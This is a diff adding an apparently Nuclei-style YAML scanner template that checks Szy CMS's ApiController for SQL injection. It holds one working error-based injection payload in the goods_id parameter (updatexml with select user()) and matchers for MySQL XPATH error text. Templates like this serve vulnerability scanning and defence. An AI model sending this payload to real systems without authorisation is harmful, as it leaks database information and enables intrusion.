@@ -1,0 +1,27 @@
+id: szy-cms-apicontroller-sql-injection
+info:
+  name: Szy CMS ApiController SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Szy CMS ApiController class is vulnerable to a SQL injection vulnerability via the goods_id parameter. Exploitation can reveal sensitive database information.
+
+http:
+  - raw:
+      - |
+        GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,(select+user()),0x7e),1) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "1105 XPATH syntax error"
+          - "@localhost"
+          - "错误位置"
+          - "<title>系统发生错误</title>"
